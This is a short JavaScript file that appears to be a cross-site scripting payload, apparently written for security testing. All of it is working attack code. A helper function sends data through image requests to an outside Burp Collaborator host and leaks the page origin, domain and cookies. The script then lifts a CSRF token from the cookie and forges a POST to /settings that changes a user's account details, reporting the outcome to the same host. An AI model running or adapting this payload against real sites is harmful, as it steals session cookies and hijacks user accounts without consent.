leak = function(name, data)
{
   var i = document.createElement('img');
   i.src = "https://yxz1eqvtp27ov7r4y4qdkmmyqpwqkf.burpcollaborator.net?" + name + "=" + btoa(data);
   document.body.appendChild(i);	
}
leak("window.origin",window.origin);
leak("document.domain",document.domain);
leak("document.cookie",document.cookie);

var csrf = document.cookie.split('=')[1];

var XHR = new XMLHttpRequest();
var FD  = new FormData();

FD.append("_csrf_token", csrf);
FD.append("name", "testing");
FD.append("user_id", "61");

XHR.addEventListener('load', function( event ) {
    leak("load_event","Data sent and response loaded.");
});

XHR.addEventListener('error', function( event ) {
    leak("error_event","Something went wrong.");
});

XHR.onload = function() {
   if (XHR.status != 200) {
      leak("onload_non200",`Error ${XHR.status}: ${XHR.statusText}`);
   } else {
      leak("onload_200",`Done, got ${XHR.response.length} bytes`);
   }
};


XHR.open('POST', '/settings');
XHR.send(FD);
